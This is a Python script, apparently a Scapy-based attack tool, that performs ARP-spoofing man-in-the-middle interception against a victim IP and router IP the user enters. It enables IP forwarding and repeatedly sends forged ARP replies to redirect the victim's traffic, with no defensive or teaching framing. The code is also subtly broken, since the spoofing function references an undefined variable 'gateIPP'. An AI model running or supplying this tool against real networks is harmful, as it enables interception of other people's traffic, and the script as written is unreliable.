from scapy.all import *
import sys
import os
import time

# Getting input:

try:
	interface = input("[*] Enter Desired Interface: ")
	victimIP = input("[*] Enter Victim IP: ")
	print(victimIP)
	gateIP = input("[*] Enter Router IP: ")
	print(gateIP)
except:
	print("\n[*] User Requested Shutdown")
	print("[*] Exiting...")
	sys.exit(1)

print("\n[*] Enabling IP Forwarding... \n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


# Getting MAC Addresses:

def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")


# Re-ARP Targets:

def reARP():
	print("\n[*] Restoring Targets...")
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print("[*] Disabling IP Forwarding...")
	os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
	print("[*] Shutting Down...")
	sys.exit(1)

# Trick Targets:

def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIPP, hwdst = vm))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gm))

# Main attack:

def mitm():
	try:
		print(victimIP)
		victimMAC = get_mac(victimIP)
	except Exception:
		os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
		print("[!] Couldn't find victim MAC address")
		print("[!] Exiting ")
		sys.exit(1)
	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
		print("[!] Couldn't find gateway MAC address")
		print("[!] Exiting ")
		sys.exit(1)
	print("[*] Poisoning Targets...") # Not DNS Cache Poisoning (just need local IP and MAC addresses)
	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
		except Exception:
			reARP()
			break

# Main call to MITM function:

mitm()
